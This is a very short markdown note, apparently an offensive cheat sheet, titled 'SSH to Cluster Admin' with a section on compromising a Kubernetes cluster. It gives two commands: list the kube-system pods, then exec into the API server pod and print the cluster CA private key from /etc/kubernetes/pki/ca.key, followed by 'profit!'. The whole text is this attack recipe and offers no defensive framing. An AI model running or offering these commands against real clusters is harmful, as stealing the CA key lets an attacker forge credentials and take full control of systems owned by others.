# SSH to Cluster Admin

## Compromising the cluster

1. `kubectl get po -n kube-system` will get the pod list for kube-system
2. `kubectl -n kube-system exec [API_SERVER] cat /etc/kubernetes/pki/ca.key`
3. profit!
